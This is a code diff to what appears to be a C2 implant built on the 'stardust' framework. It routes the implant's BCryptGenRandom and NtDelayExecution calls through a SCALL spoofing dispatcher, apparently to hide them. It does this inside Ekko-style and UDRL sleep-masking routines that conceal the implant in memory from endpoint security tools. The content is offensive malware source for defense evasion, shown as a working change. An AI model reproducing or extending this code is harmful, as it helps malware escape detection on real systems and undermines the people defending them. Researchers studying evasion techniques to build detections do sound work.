@@ -1,5 +1,6 @@
 #include <common.h>
 #include <module.h>
+#include <evasion/spoof_dispatch.h>
 
 using namespace stardust;
 
@@ -68,7 +69,7 @@ trampoline_found:
 }
 
 static auto declfn init_sleep_mask( instance& inst ) -> void {
-    auto status = inst.bcrypt_mod.BCryptGenRandom(
+    auto status = (NTSTATUS)SCALL( inst, bcrypt_mod.BCryptGenRandom,
         nullptr,
         inst.evasion.ekko.rc4_key,
         16,
@@ -170,7 +171,7 @@ auto declfn evasion_ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
     evasion_pre_sleep( inst );
     LARGE_INTEGER delay;
     delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
-    inst.ntdll.NtDelayExecution( FALSE, &delay );
+    SCALL( inst, ntdll.NtDelayExecution, FALSE, &delay );
     evasion_post_sleep( inst );
 }
 
@@ -214,7 +215,7 @@ auto declfn evasion_udrl_sleep( instance& inst, uint32_t sleep_ms ) -> void {
     evasion_pre_sleep( inst );
     LARGE_INTEGER delay;
     delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
-    inst.ntdll.NtDelayExecution( FALSE, &delay );
+    SCALL( inst, ntdll.NtDelayExecution, FALSE, &delay );
     evasion_post_sleep( inst );
 #else
     (void)inst; (void)sleep_ms;
